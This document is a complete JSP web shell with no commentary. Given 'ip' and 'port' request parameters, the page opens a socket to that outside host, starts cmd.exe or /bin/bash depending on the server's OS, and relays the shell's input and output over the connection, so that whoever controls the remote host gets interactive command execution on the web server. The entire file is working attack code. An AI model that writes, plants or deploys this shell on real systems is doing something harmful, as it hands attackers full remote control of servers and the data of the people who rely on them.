<%@ page import="java.io.*, java.net.*" %>
<%!
class StreamConnector extends Thread {
    InputStream is; OutputStream os;
    StreamConnector(InputStream is, OutputStream os) {
        this.is = is; this.os = os;
    }
    public void run() {
        try {
            BufferedReader r = new BufferedReader(new InputStreamReader(is));
            BufferedWriter w = new BufferedWriter(new OutputStreamWriter(os));
            char[] buf = new char[8192];
            int len;
            while ((len = r.read(buf)) > 0) {
                w.write(buf, 0, len);
                w.flush();
            }
        } catch (Exception ignored) {}
    }
}
%>
<%
String ip = request.getParameter("ip");
String port = request.getParameter("port");
if (ip != null && port != null) {
    try {
        Socket s = new Socket(ip, Integer.parseInt(port));
        String os = System.getProperty("os.name").toLowerCase();
        String shell = os.contains("win") ? "cmd.exe" : "/bin/bash";
        Process p = Runtime.getRuntime().exec(shell);
        new StreamConnector(p.getInputStream(), s.getOutputStream()).start();
        new StreamConnector(s.getInputStream(), p.getOutputStream()).start();
    } catch (Exception e) {
        out.println("<pre>" + e.toString() + "</pre>");
    }
}
%>
